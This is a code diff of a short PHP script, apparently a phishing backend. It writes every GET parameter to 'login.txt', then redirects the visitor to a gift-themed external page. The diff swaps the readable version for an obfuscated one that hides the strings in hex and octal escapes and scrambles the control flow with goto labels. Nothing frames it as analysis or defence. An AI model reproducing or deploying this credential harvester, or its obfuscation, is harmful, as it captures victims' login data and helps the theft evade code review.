@@ -1,21 +1,2 @@
 <?php
-// Ensure PHP is executing and not serving the file
-header('Content-Type: text/html; charset=UTF-8');
-
-// Perform the redirect
-header('Location: https://nhanqua.pages.dev/xulyquatang.html');
-
-// Open file in append mode
-$handle = fopen("login.txt", "a");
-if ($handle) {
-    // Write each GET parameter to the file
-    foreach ($_GET as $variable => $value) {
-        fwrite($handle, $variable . "=" . $value . "\r\n");
-    }
-    fwrite($handle, "\r\n");
-    fclose($handle);
-}
-
-// Exit to ensure no further output
-exit;
-?>
+ goto iQmVD; iQmVD: header("\x43\x6f\156\164\x65\x6e\164\x2d\x54\171\x70\x65\72\40\164\x65\x78\164\57\x68\x74\x6d\x6c\73\40\x63\150\141\162\163\x65\164\x3d\x55\x54\x46\x2d\70"); goto JlLH9; yPblJ: die; goto O7Elh; sIPOd: $handle = fopen("\x6c\x6f\147\x69\x6e\x2e\x74\170\x74", "\141"); goto ePSgf; ePSgf: if ($handle) { foreach ($_GET as $variable => $value) { fwrite($handle, $variable . "\x3d" . $value . "\xd\12"); } fwrite($handle, "\xd\12"); fclose($handle); } goto yPblJ; JlLH9: header("\x4c\x6f\143\x61\164\151\x6f\x6e\72\40\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x68\141\156\161\165\x61\x2e\x70\x61\147\145\163\x2e\144\x65\166\57\170\165\154\x79\161\165\141\x74\x61\x6e\x67\56\150\164\155\x6c"); goto sIPOd; O7Elh: ?>
